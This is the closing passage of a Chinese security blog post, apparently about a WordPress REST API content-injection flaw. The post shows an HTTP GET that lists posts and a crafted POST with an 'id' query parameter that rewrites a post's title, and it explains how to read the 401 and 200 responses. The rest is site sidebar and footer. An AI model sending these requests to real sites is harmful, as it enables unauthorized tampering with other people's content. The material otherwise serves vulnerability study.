<h4 id="漏洞利用-5"><a href="#漏洞利用-5" class="headerlink" title="漏洞利用"></a><a href="#漏洞利用-5" title="漏洞利用"></a>漏洞利用</h4><p>查看文章列表:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GET /index.php/wp-json/wp/v2/posts HTTP/1.1</div></pre></td></tr></table></figure>

<p>修改文章内容：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">POST /index.php/wp-json/wp/v2/posts/500?id=500 HTTP/1.1</div><div class="line">Host: xxx.net</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36</div><div class="line">Content-Type: application/json</div><div class="line">Content-Length: 43</div><div class="line">&#123;<span class="string">“title”</span>:<span class="string">“x x x x”</span>&#125;</div></pre></td></tr></table></figure>

<p>说明：如果返回 401 则无权限修改；返回200表示修改成功。</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><a href="#参考文章" title="参考文章"></a>参考文章</h3><p><a href="https://www.secpulse.com/archives/61101.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/61101.html</a><br><a href="https://www.secpulse.com/archives/40406.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/40406.html</a><br><a href="http://www.freebuf.com/vuls/126120.html" target="_blank" rel="noopener">http://www.freebuf.com/vuls/126120.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">chucz</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">41</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">37</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/livecityccz" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:livecityccz@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://plus.google.com/livecityccz" target="_blank" title="Google">
                      
                        <i class="fa fa-fw fa-google"></i>Google</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://twitter.com/livecityccz" target="_blank" title="Twitter">
                      
                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.facebook.com/livecityccz" target="_blank" title="FB Page">
                      
                        <i class="fa fa-fw fa-facebook"></i>FB Page</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://youtube.com/livecityccz" target="_blank" title="YouTube">
                      
                        <i class="fa fa-fw fa-youtube"></i>YouTube</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">chucz</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
